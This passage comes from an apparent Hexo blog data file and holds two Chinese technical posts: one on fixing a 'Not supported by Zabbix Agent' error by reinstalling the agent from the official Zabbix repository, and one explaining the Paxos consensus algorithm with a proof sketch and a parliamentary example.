NULL,&#x624B;&#x52A8;&#x53BB;&#x8BBE;&#x7F6E;&#x5B83;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x628A;&#x5B83;&#x8BBE;&#x4E3A;&#x9ED8;&#x8BA4;&#x503C;&#x3002;<br>7&#x3001;&#x5C3D;&#x91CF;&#x5C11;&#x7528; VARCHAR&#x3001;TEXT&#x3001;BLOB &#x7C7B;&#x578B;<br>8&#x3001;&#x5982;&#x679C;&#x4F60;&#x7684;&#x6570;&#x636E;&#x53EA;&#x6709;&#x4F60;&#x6240;&#x77E5;&#x7684;&#x5C11;&#x91CF;&#x7684;&#x51E0;&#x4E2A;&#x3002;&#x6700;&#x597D;&#x4F7F;&#x7528; ENUM &#x7C7B;&#x578B;<br>9&#x3001;&#x6B63;&#x5982; graymice &#x6240;&#x8BB2;&#x7684;&#x90A3;&#x6837;&#xFF0C;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x3002;<br>10&#x3001;&#x5408;&#x7406;&#x7528;&#x8FD0;&#x5206;&#x8868;&#x4E0E;&#x5206;&#x533A;&#x8868;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x5B58;&#x653E;&#x548C;&#x63D0;&#x53D6;&#x901F;&#x5EA6;&#x3002;</p>"},{"title":"Not supported by Zabbix Agent & zabbix agent重装","date":"2016-09-25T10:24:17.000Z","toc":false,"_content":"\n> zabbix服务器显示一些监控项不起效，提示错误【Not supported by Zabbix Agent】，\n最后定位为zabbix客户端版本过低。\n\n### Not supported by Zabbix Agent\n\n两台被监控的服务器，配置文件设置都一样，但是其中一台某些监控项失效，初步怀疑是版本不一致\n```bash\n/usr/sbin/zabbix_agentd -V\n```\n\n<!-- more -->\n\n结果显示zabbix agent版本分别为【2.2.14】和【1.8.22】，不起效的为1.8.22。\n以下是两个版本的安装过程：\n```bash\n#2.2.14安装步骤【参照官网】\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm\nyum install zabbix-agent\n\n#1.8.22安装步骤【相对官网，明显少了个步骤】\nyum install zabbix-agent\n```\n\n\n**yum install zabbix-agent为什么默认安装的是1.8.22？**\n通过如下命令可以查看\n```bash\nyum list all | grep zabbix-agent\n# pcp-export-zabbix-agent.x86_64             3.10.9-6.el6                 base    \n# zabbix-agent.x86_64                        1.8.22-1.el6                 epel\n```\n\n<br/>\n\n---\n\n### zabbix agent重装\n```bash\n# 卸载\nyum remove zabbix-agent\n\n# 安装\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm\nyum install zabbix-agent\n\n# 启动及查看\nservice zabbix-agent restart\nservice zabbix-agent status\n# zabbix_agentd (pid  32485) is running...\n\n/usr/sbin/zabbix_agentd -V\n# Zabbix Agent (daemon) v2.2.14 (revision 61184) (22 July 2016)\n# Compilation time: Jul 24 2016 06:52:24\n\n```\n\n","source":"_posts/Not supported by Zabbix Agent & zabbix agent重装.md","raw":"---\ntitle: Not supported by Zabbix Agent & zabbix agent重装\ncategories:\n  - 运维部署\ntags:\n  - zabbix\ndate: 2016-9-25 18:24:17\ntoc: false\n---\n\n> zabbix服务器显示一些监控项不起效，提示错误【Not supported by Zabbix Agent】，\n最后定位为zabbix客户端版本过低。\n\n### Not supported by Zabbix Agent\n\n两台被监控的服务器，配置文件设置都一样，但是其中一台某些监控项失效，初步怀疑是版本不一致\n```bash\n/usr/sbin/zabbix_agentd -V\n```\n\n<!-- more -->\n\n结果显示zabbix agent版本分别为【2.2.14】和【1.8.22】，不起效的为1.8.22。\n以下是两个版本的安装过程：\n```bash\n#2.2.14安装步骤【参照官网】\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm\nyum install zabbix-agent\n\n#1.8.22安装步骤【相对官网，明显少了个步骤】\nyum install zabbix-agent\n```\n\n\n**yum install zabbix-agent为什么默认安装的是1.8.22？**\n通过如下命令可以查看\n```bash\nyum list all | grep zabbix-agent\n# pcp-export-zabbix-agent.x86_64             3.10.9-6.el6                 base    \n# zabbix-agent.x86_64                        1.8.22-1.el6                 epel\n```\n\n<br/>\n\n---\n\n### zabbix agent重装\n```bash\n# 卸载\nyum remove zabbix-agent\n\n# 安装\nrpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm\nyum install zabbix-agent\n\n# 启动及查看\nservice zabbix-agent restart\nservice zabbix-agent status\n# zabbix_agentd (pid  32485) is running...\n\n/usr/sbin/zabbix_agentd -V\n# Zabbix Agent (daemon) v2.2.14 (revision 61184) (22 July 2016)\n# Compilation time: Jul 24 2016 06:52:24\n\n```\n\n","slug":"Not supported by Zabbix Agent & zabbix agent重装","published":1,"updated":"2016-11-17T11:59:42.668Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbv001wgwtmdpwjhxsf","content":"<blockquote>\n<p>zabbix&#x670D;&#x52A1;&#x5668;&#x663E;&#x793A;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x9879;&#x4E0D;&#x8D77;&#x6548;&#xFF0C;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x3010;Not supported by Zabbix Agent&#x3011;&#xFF0C;<br>&#x6700;&#x540E;&#x5B9A;&#x4F4D;&#x4E3A;zabbix&#x5BA2;&#x6237;&#x7AEF;&#x7248;&#x672C;&#x8FC7;&#x4F4E;&#x3002;</p>\n</blockquote>\n<h3 id=\"Not-supported-by-Zabbix-Agent\"><a href=\"#Not-supported-by-Zabbix-Agent\" class=\"headerlink\" title=\"Not supported by Zabbix Agent\"></a>Not supported by Zabbix Agent</h3><p>&#x4E24;&#x53F0;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BBE;&#x7F6E;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x4E2D;&#x4E00;&#x53F0;&#x67D0;&#x4E9B;&#x76D1;&#x63A7;&#x9879;&#x5931;&#x6548;&#xFF0C;&#x521D;&#x6B65;&#x6000;&#x7591;&#x662F;&#x7248;&#x672C;&#x4E0D;&#x4E00;&#x81F4;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/sbin/zabbix_agentd -V</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>&#x7ED3;&#x679C;&#x663E;&#x793A;zabbix agent&#x7248;&#x672C;&#x5206;&#x522B;&#x4E3A;&#x3010;2.2.14&#x3011;&#x548C;&#x3010;1.8.22&#x3011;&#xFF0C;&#x4E0D;&#x8D77;&#x6548;&#x7684;&#x4E3A;1.8.22&#x3002;<br>&#x4EE5;&#x4E0B;&#x662F;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#x7684;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#2.2.14&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x3010;&#x53C2;&#x7167;&#x5B98;&#x7F51;&#x3011;</span></span><br><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm</span><br><span class=\"line\">yum install zabbix-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#1.8.22&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x3010;&#x76F8;&#x5BF9;&#x5B98;&#x7F51;&#xFF0C;&#x660E;&#x663E;&#x5C11;&#x4E86;&#x4E2A;&#x6B65;&#x9AA4;&#x3011;</span></span><br><span class=\"line\">yum install zabbix-agent</span><br></pre></td></tr></table></figure></p>\n<p><strong>yum install zabbix-agent&#x4E3A;&#x4EC0;&#x4E48;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;&#x662F;1.8.22&#xFF1F;</strong><br>&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x67E5;&#x770B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum list all | grep zabbix-agent</span><br><span class=\"line\"><span class=\"comment\"># pcp-export-zabbix-agent.x86_64             3.10.9-6.el6                 base    </span></span><br><span class=\"line\"><span class=\"comment\"># zabbix-agent.x86_64                        1.8.22-1.el6                 epel</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<hr>\n<h3 id=\"zabbix-agent&#x91CD;&#x88C5;\"><a href=\"#zabbix-agent&#x91CD;&#x88C5;\" class=\"headerlink\" title=\"zabbix agent&#x91CD;&#x88C5;\"></a>zabbix agent&#x91CD;&#x88C5;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x5378;&#x8F7D;</span></span><br><span class=\"line\">yum remove zabbix-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5B89;&#x88C5;</span></span><br><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm</span><br><span class=\"line\">yum install zabbix-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x542F;&#x52A8;&#x53CA;&#x67E5;&#x770B;</span></span><br><span class=\"line\">service zabbix-agent restart</span><br><span class=\"line\">service zabbix-agent status</span><br><span class=\"line\"><span class=\"comment\"># zabbix_agentd (pid  32485) is running...</span></span><br><span class=\"line\"></span><br><span class=\"line\">/usr/sbin/zabbix_agentd -V</span><br><span class=\"line\"><span class=\"comment\"># Zabbix Agent (daemon) v2.2.14 (revision 61184) (22 July 2016)</span></span><br><span class=\"line\"><span class=\"comment\"># Compilation time: Jul 24 2016 06:52:24</span></span><br></pre></td></tr></table></figure>\n","excerpt":"<blockquote>\n<p>zabbix&#x670D;&#x52A1;&#x5668;&#x663E;&#x793A;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x9879;&#x4E0D;&#x8D77;&#x6548;&#xFF0C;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x3010;Not supported by Zabbix Agent&#x3011;&#xFF0C;<br>&#x6700;&#x540E;&#x5B9A;&#x4F4D;&#x4E3A;zabbix&#x5BA2;&#x6237;&#x7AEF;&#x7248;&#x672C;&#x8FC7;&#x4F4E;&#x3002;</p>\n</blockquote>\n<h3 id=\"Not-supported-by-Zabbix-Agent\"><a href=\"#Not-supported-by-Zabbix-Agent\" class=\"headerlink\" title=\"Not supported by Zabbix Agent\"></a>Not supported by Zabbix Agent</h3><p>&#x4E24;&#x53F0;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BBE;&#x7F6E;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x4E2D;&#x4E00;&#x53F0;&#x67D0;&#x4E9B;&#x76D1;&#x63A7;&#x9879;&#x5931;&#x6548;&#xFF0C;&#x521D;&#x6B65;&#x6000;&#x7591;&#x662F;&#x7248;&#x672C;&#x4E0D;&#x4E00;&#x81F4;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/sbin/zabbix_agentd -V</span><br></pre></td></tr></table></figure></p>","more":"<p>&#x7ED3;&#x679C;&#x663E;&#x793A;zabbix agent&#x7248;&#x672C;&#x5206;&#x522B;&#x4E3A;&#x3010;2.2.14&#x3011;&#x548C;&#x3010;1.8.22&#x3011;&#xFF0C;&#x4E0D;&#x8D77;&#x6548;&#x7684;&#x4E3A;1.8.22&#x3002;<br>&#x4EE5;&#x4E0B;&#x662F;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#x7684;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#2.2.14&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x3010;&#x53C2;&#x7167;&#x5B98;&#x7F51;&#x3011;</span></span><br><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm</span><br><span class=\"line\">yum install zabbix-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#1.8.22&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x3010;&#x76F8;&#x5BF9;&#x5B98;&#x7F51;&#xFF0C;&#x660E;&#x663E;&#x5C11;&#x4E86;&#x4E2A;&#x6B65;&#x9AA4;&#x3011;</span></span><br><span class=\"line\">yum install zabbix-agent</span><br></pre></td></tr></table></figure></p>\n<p><strong>yum install zabbix-agent&#x4E3A;&#x4EC0;&#x4E48;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;&#x662F;1.8.22&#xFF1F;</strong><br>&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x67E5;&#x770B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum list all | grep zabbix-agent</span><br><span class=\"line\"><span class=\"comment\"># pcp-export-zabbix-agent.x86_64             3.10.9-6.el6                 base    </span></span><br><span class=\"line\"><span class=\"comment\"># zabbix-agent.x86_64                        1.8.22-1.el6                 epel</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<hr>\n<h3 id=\"zabbix-agent&#x91CD;&#x88C5;\"><a href=\"#zabbix-agent&#x91CD;&#x88C5;\" class=\"headerlink\" title=\"zabbix agent&#x91CD;&#x88C5;\"></a>zabbix agent&#x91CD;&#x88C5;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x5378;&#x8F7D;</span></span><br><span class=\"line\">yum remove zabbix-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5B89;&#x88C5;</span></span><br><span class=\"line\">rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm</span><br><span class=\"line\">yum install zabbix-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x542F;&#x52A8;&#x53CA;&#x67E5;&#x770B;</span></span><br><span class=\"line\">service zabbix-agent restart</span><br><span class=\"line\">service zabbix-agent status</span><br><span class=\"line\"><span class=\"comment\"># zabbix_agentd (pid  32485) is running...</span></span><br><span class=\"line\"></span><br><span class=\"line\">/usr/sbin/zabbix_agentd -V</span><br><span class=\"line\"><span class=\"comment\"># Zabbix Agent (daemon) v2.2.14 (revision 61184) (22 July 2016)</span></span><br><span class=\"line\"><span class=\"comment\"># Compilation time: Jul 24 2016 06:52:24</span></span><br></pre></td></tr></table></figure>"},{"title":"Paxos算法","date":"2016-11-07T14:41:19.000Z","_content":"\nPaxos算法是莱斯利·兰伯特（英语：Leslie Lamport，LaTeX中的“La”）于1990年提出的一种基于消息传递且具有高度容错特性的一致性算法。\n\n## 问题和假设\n**分布式系统中的节点通信存在两种模型：共享内存（Shared memory）和消息传递（Messages passing）**。基于消息传递通信模型的分布式系统，不可避免的会发生以下错误：进程可能会慢、被杀死或者重启，消息可能会延迟、丢失、重复，在基础Paxos场景中，先不考虑可能出现消息篡改即[拜占庭错误](https://zh.wikipedia.org/wiki/拜占庭将军问题)的情况。Paxos算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。**一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。**为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个“一致性算法”以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。因此从20世纪80年代起对于一致性算法的研究就没有停止过。\n\n<!-- more -->\n\n为描述Paxos算法，Lamport虚拟了一个叫做Paxos的希腊城邦，这个岛按照议会民主制的政治模式制订法律，但是没有人愿意将自己的全部时间和精力放在这种事情上。所以无论是议员，议长或者传递纸条的服务员都不能承诺别人需要时一定会出现，也无法承诺批准决议或者传递消息的时间。但是这里假设没有拜占庭将军问题（Byzantine failure，即虽然有可能一个消息被传递了两次，但是绝对不会出现错误的消息）；只要等待足够的时间，消息就会被传到。另外，Paxos岛上的议员是不会反对其他议员提出的决议的。\n\n对应于分布式系统，议员对应于各个节点，制定的法律对应于系统的状态。各个节点需要进入一个一致的状态，例如在独立Cache的对称多处理器系统中，各个处理器读内存的某个字节时，必须读到同样的一个值，否则系统就违背了一致性的要求。一致性要求对应于法律条文只能有一个版本。议员和服务员的不确定性对应于节点和消息传递通道的不可靠性。\n\n---\n\n## 算法\n### 算法的提出与证明\n首先将议员的角色分为proposers，acceptors，和learners（允许身兼数职）。proposers提出提案，提案信息包括提案编号和提议的value；acceptor收到提案后可以接受（accept）提案，若提案获得多数acceptors的接受，则称该提案被批准（chosen）；learners只能“学习”被批准的提案。划分角色后，就可以更精确的定义问题：\n- 决议（value）只有在被proposers提出后才能被批准（未经批准的决议称为“提案（proposal）”）；\n- 在一次Paxos算法的执行实例中，只批准（chosen）一个value；\n- learners只能获得被批准（chosen）的value。\n\n另外还需要保证progress。这一点以后再讨论。\n\n作者通过不断加强上述3个约束（主要是第二个）获得了Paxos算法。\n\n批准value的过程中，首先proposers将value发送给acceptors，之后acceptors对value进行接受（accept）。为了满足只批准一个value的约束，要求经“多数派（majority）”接受的value成为正式的决议（称为“批准”决议）。这是因为无论是按照人数还是按照权重划分，两组“多数派”至少有一个公共的acceptor，如果每个acceptor只能接受一个value，约束2就能保证。\n\n于是产生了一个显而易见的新约束：\n```bash\nP1：一个acceptor必须接受（accept）第一次收到的提案。\n```\n注意P1是不完备的。如果恰好一半acceptor接受的提案具有value A，另一半接受的提案具有value B，那么就无法形成多数派，无法批准任何一个value。\n\n约束2并不要求只批准一个提案，暗示可能存在多个提案。只要提案的value是一样的，批准多个提案不违背约束2。于是可以产生约束P2：\n```bash\nP2：一旦一个具有value v的提案被批准（chosen），那么之后批准（chosen）的提案必须具有value v。\n```\n> 注：通过某种方法可以为每个提案分配一个编号，在提案之间建立一个全序关系，所谓“之后”都是指所有编号更大的提案。\n\n如果P1和P2都能够保证，那么约束2就能够保证。\n\n批准一个value意味着多个acceptor接受（accept）了该value.因此，可以对P2进行加强：\n```bash\nP2a：一旦一个具有value v的提案被批准（chosen），那么之后任何acceptor再次接受（accept）的提案必须具有value v。\n```\n\n由于通信是异步的，P2a和P1会发生冲突。如果一个value被批准后，一个proposer和一个acceptor从休眠中苏醒，前者提出一个具有新的value的提案。根据P1，后者应当接受，根据P2a，则不应当接受，这中场景下P2a和P1有矛盾。于是需要换个思路，转而对proposer的行为进行约束：\n```bash\nP2b：一旦一个具有value v的提案被批准（chosen），那么以后任何proposer提出的提案必须具有value v。\n```\n\n由于acceptor能接受的提案都必须由proposer提出，所以P2b蕴涵了P2a，是一个更强的约束。\n但是根据P2b难以提出实现手段。因此需要进一步加强P2b。\n\n假设一个编号为m的value v已经获得批准（chosen），来看看在什么情况下对任何编号为n（n>m）的提案都含有value v。因为m已经获得批准（chosen），显然存在一个acceptors的多数派C，他们都接受（accept）了v。考虑到任何多数派都和C具有至少一个公共成员，可以找到一个蕴涵P2b的约束P2c：\n```bash\nP2c：如果一个编号为n的提案具有value v，那么存在一个多数派，要么他们中所有人都没有接受（accept）编号小于n \n的任何提案，要么他们已经接受（accept）的所有编号小于n的提案中编号最大的那个提案具有value v。\n```\n\n**可以用数学归纳法证明P2c蕴涵P2b：**\n假设具有value v的提案m获得批准，当n=m+1时，采用反证法，假如提案n不具有value v，而是具有value w，根据P2c，则存在一个多数派S1，要么他们中没有人接受过编号小于n的任何提案，要么他们已经接受的所有编号小于n的提案中编号最大的那个提案是value w。由于S1和通过提案m时的多数派C之间至少有一个公共的acceptor，所以以上两个条件都不成立，导出矛盾从而推翻假设，证明了提案n必须具有value v；\n\n若（m+1）..（N-1）所有提案都具有value v，采用反证法，假如新提案N不具有value v，而是具有value w',根据P2c，则存在一个多数派S2，要么他们没有接受过m..（N-1）中的任何提案，要么他们已经接受的所有编号小于N的提案中编号最大的那个提案是value w'。由于S2和通过m的多数派C之间至少有一个公共的acceptor，所以至少有一个acceptor曾经接受了m，从而也可以推出S2中已接受的所有编号小于n的提案中编号最大的那个提案的编号范围在m..（N-1）之间，而根据初始假设，m..（N-1）之间的所有提案都具有value v，所以S2中已接受的所有编号小于n的提案中编号最大的那个提案肯定具有value v，导出矛盾从而推翻新提案n不具有value v的假设。根据数学归纳法，我们证明了若满足P2c，则P2b一定满足。\n\nP2c是可以通过消息传递模型实现的。另外，引入了P2c后，也解决了前文提到的P1不完备的问题。\n\n### 算法的内容\n要满足P2c的约束，proposer提出一个提案前，首先要和足以形成多数派的acceptors进行通信，获得他们进行的最近一次接受（accept）的提案（prepare过程），之后根据回收的信息决定这次提案的value，形成提案开始投票。当获得多数acceptors接受（accept）后，提案获得批准（chosen），由proposer将这个消息告知learner。这个简略的过程经过进一步细化后就形成了Paxos算法。\n\n在一个paxos实例中，每个提案需要有不同的编号，且编号间要存在全序关系。可以用多种方法实现这一点，例如将序数和proposer的名字拼接起来。如何做到这一点不在Paxos算法讨论的范围之内。\n\n如果一个没有chosen过任何proposer提案的acceptor在prepare过程中回答了一个proposer针对提案n的问题，但是在开始对n进行投票前，又接受（accept）了编号小于n的另一个提案（例如n-1），如果n-1和n具有不同的value，这个投票就会违背P2c。因此在prepare过程中，acceptor进行的回答同时也应包含承诺：不会再接受（accept）编号小于n的提案。这是对P1的加强：\n```bash\nP1a：当且仅当acceptor没有回应过编号大于n的prepare请求时，acceptor接受（accept）编号为n的提案。\n```\n现在已经可以提出完整的算法了。\n\n#### 决议的提出与批准\n通过一个决议分为两个阶段：\n- prepare阶段：\n\t- proposer选择一个提案编号n并将prepare请求发送给acceptors中的一个多数派；\n\t- acceptor收到prepare消息后，如果提案的编号大于它已经回复的所有prepare消息，则acceptor将自己上次接受的提案回复给proposer，并承诺不再回复小于n的提案；\n- 批准阶段：\n\t- 当一个proposer收到了多数acceptors对prepare的回复后，就进入批准阶段。它要向回复prepare请求的acceptors发送accept请求，包括编号n和根据P2c决定的value（如果根据P2c没有已经接受的value，那么它可以自由决定value）。\n\t- 在不违背自己向其他proposer的承诺的前提下，acceptor收到accept请求后即接受这个请求。\n\n这个过程在任何时候中断都可以保证正确性。例如如果一个proposer发现已经有其他proposers提出了编号更高的提案，则有必要中断这个过程。因此为了优化，在上述prepare过程中，如果一个acceptor发现存在一个更高编号的提案，则需要通知proposer，提醒其中断这次提案。\n\n#### 实例\n用实际的例子来更清晰地描述上述过程：\n有A1, A2, A3, A4, A5 5位议员，就税率问题进行决议。议员A1决定将税率定为10%,因此它向所有人发出一个草案。这个草案的内容是：\n```bash\n现有的税率是什么?如果没有决定，则建议将其定为10%.时间：本届议会第3年3月15日;提案者：A1\n```\n在最简单的情况下，没有人与其竞争;信息能及时顺利地传达到其它议员处。\n于是, A2-A5回应：\n```bash\n我已收到你的提案，等待最终批准\n```\n而A1在收到2份回复后就发布最终决议：\n```bash\n税率已定为10%,新的提案不得再讨论本问题。\n```\n这实际上退化为二阶段提交协议。\n现在我们假设在A1提出提案的同时, A5决定将税率定为20%:\n```bash\n现有的税率是什么?如果没有决定，则建议将其定为20%.时间：本届议会第3年3月15日;提案者：A5\n```\n草案要通过侍从送到其它议员的案头. A1的草案将由4位侍从送到A2-A5那里。现在，负责A2和A3的侍从将草案顺利送达，负责A4和A5的侍从则不上班. A5的草案则顺利的送至A3和A4手中。\n\n现在, A1, A2, A3收到了A1的提案; A3, A4, A5收到了A5的提案。按照协议, A1, A2, A4, A5将接受他们收到的提案，侍从将拿着\n```bash\n我已收到你的提案，等待最终批准\n```\n的回复回到提案者那里。\n而A3的行为将决定批准哪一个。\n\n##### 情况一\n假设A1的提案先送到A3处，而A5的侍从决定放假一段时间。于是A3接受并派出了侍从. A1等到了两位侍从，加上它自己已经构成一个多数派，于是税率10%将成为决议. A1派出侍从将决议送到所有议员处：\n```bash\n税率已定为10%,新的提案不得再讨论本问题。\n```\nA3在很久以后收到了来自A5的提案。由于税率问题已经讨论完毕，他决定不再理会。但是他要抱怨一句：\n```bash\n税率已在之前的投票中定为10%,你不要再来烦我!\n```\n这个回复对A5可能有帮助，因为A5可能因为某种原因很久无法与与外界联系了。当然更可能对A5没有任何作用，因为A5可能已经从A1处获得了刚才的决议。\n\n##### 情况二\n依然假设A1的提案先送到A3处，但是这次A5的侍从不是放假了，只是中途耽搁了一会。这次, A3依然会将\"接受\"回复给A1.但是在决议成型之前它又收到了A5的提案。这时协议有两种处理方式：\n1.如果A5的提案更早，按照传统应该由较早的提案者主持投票。现在看来两份提案的时间一样（本届议会第3年3月15日）。但是A5是个惹不起的大人物。于是A3回复：\n```bash\n我已收到您的提案，等待最终批准，但是您之前有人提出将税率定为10%,请明察。\n```\n于是, A1和A5都收到了足够的回复。这时关于税率问题就有两个提案在同时进行。但是A5知道之前有人提出税率为10%.于是A1和A5都会向全体议员广播：\n```bash\n税率已定为10%,新的提案不得再讨论本问题。\n```\n一致性得到了保证。\n\n2. A5是个无足轻重的小人物。这时A3不再理会他, A1不久后就会广播税率定为10%.\n\n##### 情况三\n在这个情况中，我们将看见，根据提案的时间及提案者的权势决定是否应答是有意义的。在这里，时间和提案者的权势就构成了给提案编号的依据。这样的编号符合\"任何两个提案之间构成偏序\"的要求。\n\nA1和A5同样提出上述提案，这时A1可以正常联系A2和A3; A5也可以正常联系这两个人。这次A2先收到A1的提案; A3则先收到A5的提案. A5更有权势。\n\n在这种情况下，已经回答A1的A2发现有比A1更有权势的A5提出了税率20%的新提案，于是回复A5说：\n```bash\n我已收到您的提案，等待最终批准。\n```\n而回复了A5的A3发现新的提案者A1是个小人物，不予理会。\n\nA1没有达到多数，A5达到了，于是A5将主持投票，决议的内容是A5提出的税率20%.\n\n如果A3决定平等地对待每一位议员，对A1做出\"你之前有人提出将税率定为20%\"的回复，则将造成混乱。这种情况下A1和A5都将试图主持投票，但是这次两份提案的内容不同。\n\n这种情况下, A3若对A1进行回复，只能说：\n```bash\n有更大的人物关注此事，请等待他做出决定。\n```\n\n另外，在这种情况下, A4与外界失去了联系。等到他恢复联系，并需要得知税率情况时，他（在最简单的协议中）将提出一个提案：\n```bash\n现有的税率是什么?如果没有决定，则建议将其定为15%.时间：本届议会第3年4月1日;提案者：A4\n```\n这时，（在最简单的协议中）其他议员将会回复：\n```bash\n税率已在之前的投票中定为20%,你不要再来烦我!\n```\n\n#### 决议的发布\n一个显而易见的方法是当acceptors批准一个value时，将这个消息发送给所有learner。但是这个方法会导致消息量过大。\n由于假设没有Byzantine failures，learners可以通过别的learners获取已经通过的决议。因此acceptors只需将批准的消息发送给指定的某一个learner，其他learners向它询问已经通过的决议。这个方法降低了消息量，但是指定learner失效将引起系统失效。\n\n因此acceptors需要将accept消息发送给learners的一个子集，然后由这些learners去通知所有learners。\n但是由于消息传递的不确定性，可能会没有任何learner获得了决议批准的消息。当learners需要了解决议通过情况时，可以让一个proposer重新进行一次提案。注意一个learner可能兼任proposer。\n\n#### Progress的保证\n根据上述过程当一个proposer发现存在编号更大的提案时将终止提案。这意味着提出一个编号更大的提案会终止之前的提案过程。如果两个proposer在这种情况下都转而提出一个编号更大的提案，就可能陷入活锁，违背了Progress的要求。这种情况下的解决方案是选举出一个leader，仅允许leader提出提案。但是由于消息传递的不确定性，可能有多个proposer自认为自己已经成为leader。Lamport在The Part-Time Parliament一文中描述并解决了这个问题。\n","source":"_posts/Paxos算法.md","raw":"---\ntitle: 